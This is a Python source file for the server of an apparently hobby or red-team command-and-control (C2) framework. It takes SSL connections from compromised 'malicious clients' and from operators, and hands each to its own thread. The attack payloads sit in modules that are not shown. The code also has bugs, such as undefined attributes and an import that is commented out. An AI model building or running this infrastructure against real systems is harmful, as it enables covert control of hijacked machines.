#!/bin/python3
try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    #import select
    import logging
    import argparse
    #import json
    #import math
    import threading
    import traceback
    import ssl


    # My Modules
    #import json_parser_dev as json_parser
    import DataEngine.JsonHandler as json_parser
    #from DataEngine.RSAEncryptionHandler import Encryptor ##  Not needed, switching to SSL

    import ClientEngine.FriendlyClientHandler
    import ClientEngine.MaliciousClientHandler
    import ClientEngine.AuthenticationHandler

    import Comms.CommsHandler

    import Utils.UtilsHandler
    import Utils.KeyGen

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()
    #if not continue_anyways():
        #exit()

#import httpserver.httpserver as httpserver

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)
parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")


args = parser.parse_args()
ip = args.ip
port = int(args.port)
quiet = args.quiet
fileserverport = args.fileserverport
generate_keys = args.generatekeys

sys_path = os.path.dirname(os.path.realpath(__file__))
#print(sys_path)

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())
    

################
## Initial Handler
################ 
    """
    This is the first thing that friendly, and malicious clients talk to. 
    
    Flow:
    (this is a loop)
    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
    
    """

class ServerSockHandler:
    def __init__(self):
        logging.debug(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"
        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
        self.SxXX = "Unkown error: "
        ## Other Values
        self.http_redirect = "https://youtube.com"
        ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        self.friendly_current_clients = []
        self.friendly_clients = {}

        ## init per-client details. these exist so there are no unknown variable errors later
        self.client_type = ""
        self.id = None
        self.message = ""
        self.action = ""
        self.response = ""

        ## Modules
        ## This compiles the JSON schema and returns it
        #bypassing for now. 
        self.json_parser = json_parser.json_ops()

        # generating global priv & pub keys
        self.encryption = Encryptor(key_length=2048)
        self.encryption.generate_keys()

        # sanity check that keys got generated
        #print(len(encryption.private_key))
        #print(len(encryption.public_key))

    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and passes them off to connection_handler()
                        
        ip (str): The IP for the server to listen on
        port (int): The port for the server to listen on
        """
    ##== Initial Connection (these are server connections, NOT client connetions)
        
    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
    ## custom protocol stuff - who knows

    ##### MOVE TO INDEPENDENT FILE ####
        ## return respective items, or just use buffers

        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)
            ## A cleanup function incase of crash/on exit
            atexit.register(self.socket_cleanup)
            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")

            ## starting listener
            self.server.listen()
            self.connection_handler()
        
        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")
    ##### /END MOVE TO INDEPENDENT FILE ####
                
              
        
    def connection_handler(self):
        """The loop that handles the conections, and passes them off to respective threads/classes
            
        Some notes:
            - This is meant to be run as an infinite listen loop, handling each initial connection before passing it off to its respective threads. If an except is triggered in any function, that
                must return false, as that tells the loop to continue to the next iteration/listening state. There are probably better ways to do this, but for now the return  is simple & works well
            
        """

        ## I kinda wanna name this loop, cascade sounds cool
        while True:
        ##== Initial handling of client
            ssl_socket = self.server_ssl_handler()

            if not ssl_socket:
                continue

        ##### MOVE TO INDEPENDENT FILE ####
        ##== Parsing the message sent to the server. 
            try:
                # English: Hey, I (server) wants to recieve a message. Not sure if encrypted or not, passing my private key to the decrypt function just in case
                #response = receive_msg(conn=ssl_socket, private_key=self.encryption.private_key)
                response = Comms.CommsHandler.receive_msg(conn=ssl_socket)

                ## Converting to json. Validation is disabled during dev.
                response_from_client = self.json_parser.convert_and_validate(response)

                if response_from_client: 
                    client_type    = response_from_client["general"]["client_type"]
                    id             = response_from_client["general"]["client_id"]
                    message        = response_from_client["msg"]["msg_command"]
                    action         = response_from_client["general"]["action"]

                    print(f"DEBUG: MSG Breakdown\n\tSelf.client_type: {self.client_type}\n\tself.id: {self.id}\n\tself.message: {self.message}\n\tself.action: {self.action}\n\n")
                else:
                    print("Nothing recieved from client")

            except Exception as e:
                logging.debug(f"No message, action, type, or id recieved. , error={e}")
                print(traceback.format_exc())

        ##== The decision handler based on the client_type, which can be:
            ## !_clientlogin_!: A malicious client "logging" in
            ## !_userlogin_!: A friendly client trying to log in    
            
            ## == Decisions based on parsed messages
            if self.action == "!_userlogin_!":
                ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
                if not self.userloginhandler(
                    response_from_client=response_from_client,
                    ssl_conn = ssl_socket):
                    
                    continue
             
            ## !_client_! handler
            elif self.action == "!_clientlogin_!":
                if not self.clientloginhandler(
                    ssl_conn = ssl_socket,
                    response_from_client=response_from_client):
                    
                    continue
            
            ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
                self.conn.close()
                logging.debug("Recieved HTTP Request to C2 server... closing connection")
                
            else:
                logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {self.response} ")
                self.conn.close()


    def server_ssl_handler(self) -> socket:
        '''
        This function accepts connections, wraps them in SSL, and returns the SSL enabled socket.
        '''
        try:
            non_ssl_conn, addr = self.server.accept()

        ## Getting client id from the client, and the IP address
            ## this var is only used for printing info, not as any 'real' data
            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")

        # Wrapping socket into SSL socket
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')  # Load server's certificate and private key
            ssl_context.verify_mode = ssl.CERT_NONE  # Do not verify the client's certificate, aka self signed
            ssl_socket = ssl_context.wrap_socket(non_ssl_conn, server_side=True)
            
            return ssl_socket
        except ssl.SSLError as ssle:
            '''
             [SSL: SSLV3_ALERT_CERTIFICATE_UNKNOWN] sslv3 alert certificate unknown (_ssl.c:1129)
                - This error comes from browsers connecting to the server. Can't really get past unless you have your own (legit) certs
            
            [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1129)
                - Old SSL or client does not support SSL
                
            '''
            logging.warning(f"[Server (server_ssl_handler)] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            logging.warning(f"[Server (server_ssl_handler)] Client {self.client_remote_ip_port} disconnected")
            return False
        except FileNotFoundError as fnfe:
            logging.debug(f"[Server (server_ssl_handler)] Missing a file, either .CRT or .KEY: {type(e)}")

        except Exception as e:
            logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
            return False     
  
    def socket_cleanup(self):
        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
        & no errors are run into. Left fairly empty for now, may have more use in the future.
            
        Called by start_server
            """
        try:
            ## closing the connection
            self.server.close()
            logging.debug(self.Sx02)
        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")  

    def userloginhandler(self, response_from_client, ssl_conn):
        '''
        This function:
            - Sees if a client has logged in before
            - Checks authentication
            - Creates an instance of FriendlyClientHandler.py
            - Puts that instance in a new thread
        
        '''
        ## attempting to retrieve JSON values
        username, password = None, None
        try:
            # Try to extract the username and password from the message
             #username, password = self.id, self.message
            username = response_from_client["general"]["client_id"]
            password = response_from_client["general"]["password"]
        
        except ValueError as e:
                    # If there is a value error, set the username and password to None
            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
            return False
        except Exception as e:
                    # If there is any other exception, set the username and password to None
            logging.debug(f"Unknown error with logon process: {e}")
            return  False


        ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
        friendly_client_name = f"!!~{username}"                    
        
        ## Running the authentication check, and starting the friendly client thread if successful
        if ClientEngine.AuthenticationHandler.Authentication.password_eval(password):
            try:
                ##== sending the a-ok on successful authentication
                Comms.CommsHandler.send_msg(msg="0", conn=self.conn)

                logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
                # Add friendly client to current clients list
                self.friendly_current_clients.append(friendly_client_name)
                            
                ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
                ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
                ## additionally, this is where the connection & parameters are passed off to the ServerFriendlyClientHandler class.
                
                self.friendly_clients[friendly_client_name] = ClientEngine.FriendlyClientHandler.ServerFriendlyClientHandler(self.conn, self.ADDR, self.json_parser)
                globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]

                ## == Thread handler
                # Create thread for the friendly client's communication
                threading.Thread(
                    target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                    args=(self.response, username)
                    ).start()

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                return False
            
            except Exception as e:
                logging.warning(f"[Friendly Client Error]:{e}")
                return False
                        
        ## On failed authentication, sending back a 1 & log
        else:
            #self.conn.send(str_encode("1"))
            Comms.CommsHandler.send_msg(msg="1", conn=self.conn)
            logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")  

    def clientloginhandler(self, ssl_conn, response_from_client):
        '''
        This function:
            - Sees if a client has logged in before
            - Creates an instance of MaliciousClientHandler.py
            - Puts that instance in a new thread

        Note, if there is an exception, the function returns to continue on with the conn loop. might take some work
        
        '''
        id = None
        try:
            # Try to extract the username and password from the message
             #username, password = self.id, self.message
            id = response_from_client["general"]["client_id"]
        
        except ValueError as e:
                    # If there is a value error, set the username and password to None
            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
            return False
        
        except Exception as e:
            # If there is any other exception, set the username and password to None
            logging.debug(f"Unknown error with logon process: {e}")
            return False
        
        # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
        #client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id

        try:
            #note, ssl_conn.getpeername may not work
            client_name = "client_" + self.ssl_conn.getpeername()[0].replace(".", "_") + "_" + self.id
            
            # If client is not in current clients list, add it
            if client_name not in self.current_clients:
                self.current_clients.append(client_name)

                # Create a new malicious client handler instance and add it to the clients dict
                self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler()
                globals()[client_name] = self.clients[client_name]

            # Create a new thread for this client's communication
            threading.Thread(
                target=self.clients[client_name].handle_client,
                args=(ssl_conn, self.response, id)
                ).start()  

        except Exception as e:
            logging.debug(f"Server (clientloginhandler)] Unknown Error: {e}")
            return False


def continue_anyways():
    '''
    A little function that propmts the user to continue anyway. Returns true/false. 

    Here as well as in UtilsHandler, incase the import fails
    '''
    if input("Enter 'y' to continue execution (high chance of failure), or any other key to exit: ").lower() == "y":
        return True
    else:
        return False

#if __name__ == "__main__":
if fileserverport == port:
    logging.critical(f"[SERVER] Fileserver ({fileserverport}) & Listenserver ({port}) port are the same. They need to be different ")

#fs_thread = threading.Thread(target=httpserver.fileserver_start, kwargs={'ip': "0.0.0.0",'port': fileserverport})
#fs_thread.start()

#Data.json_create()
try:
    ## Temp file check, will be put  in a func later
    Utils.UtilsHandler.file_check(f"{sys_path}/server.crt")
    
    if generate_keys:
        Utils.KeyGen.ssl_gen(
            save_file_path=sys_path
        )

    s = ServerSockHandler()
    s.start_server(ip, port)
except KeyboardInterrupt as ke:
    print("\n[server.py] Kill Signal received, shutting down")
except Exception as e:
    print(f"[server.py] Error occured: {e}")